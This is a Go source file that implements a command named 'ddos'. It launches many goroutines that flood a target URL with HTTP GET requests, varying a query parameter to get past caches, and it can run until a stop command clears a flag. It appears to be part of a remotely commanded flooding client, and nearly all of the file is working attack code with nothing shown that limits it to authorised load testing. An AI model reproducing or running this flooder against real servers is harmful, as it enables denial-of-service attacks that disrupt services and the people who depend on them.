package utils

import (
	"fmt"
	"net/http"
	"strconv"
)

type LTCommand interface {
	GetId() (id int)
	Execute()
}

type LTCommandDDOS struct {
	Id       int
	Url      string
	Routines int
	Requests int
	Seconds  int
}

func (ltc *LTCommandDDOS) GetId() (id int) {
	return ltc.Id
}

func (ltc *LTCommandDDOS) Execute() {
	for i := 0; i < ltc.Routines; i++ {
		go performMultiRequest(ltc.Url+"?a="+strconv.Itoa(i), ltc.Requests)
	}
}

type LTCommandStop struct {
	Id int
}

func (ltc *LTCommandStop) GetId() (id int) {
	return ltc.Id
}

func (ltc *LTCommandStop) Execute() {
	GetHelper().FL_KEEP_GOING = false
	GetHelper().FL_QUIT = true
}

type LTCommandError struct {
	command CommandType
}

func (e LTCommandError) Error() string {
	return fmt.Sprintf("Uncknown command \"%s\"", e.command.Name)
}

//func PutCommand(){
//	h := GetHelper()
//	h.CommandStack = append(h.CommandStack,	CommandType{100, "ddos", nil})
//	print(h.CommandStack)
//}
//
//func GetCommand(){
//	h := GetHelper()
//	h.CommandStack = append(h.CommandStack[:1], h.CommandStack[2:]...)
//}

func performRequest(url string) (status int) {
	status = 0
	resp, err := http.Get(url)
	if err == nil {
		status = resp.StatusCode
		WriteLog(status, " ", url)
		resp.Body.Close()
	} else {
		status = -1
		WriteLog(err)
	}
	return status
}

func performMultiRequest(url string, count int) {
	if count == 0 {
		for {
			if !GetHelper().FL_KEEP_GOING {
				break
			}
			GetHelper().C <- performRequest(url)
		}
	} else {
		for i := 0; i < count; i++ {
			if !GetHelper().FL_KEEP_GOING {
				break
			}
			GetHelper().C <- performRequest(url)
		}
	}
}
